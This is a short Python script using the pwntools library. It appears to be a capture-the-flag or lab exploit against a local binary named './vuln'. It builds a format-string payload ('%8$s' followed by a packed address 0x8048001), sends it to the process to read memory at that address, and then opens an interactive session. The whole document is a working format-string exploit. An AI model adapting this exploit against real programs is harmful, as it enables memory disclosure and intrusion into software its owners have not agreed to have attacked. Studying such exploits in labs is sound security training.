from pwn import *


context.binary = ELF("./vuln")
fmt_offset = 6


p = process()
payload = f"%{fmt_offset + 2}$s||||".encode()
payload += p32(0x8048001)

p.sendline(payload)

p.interactive()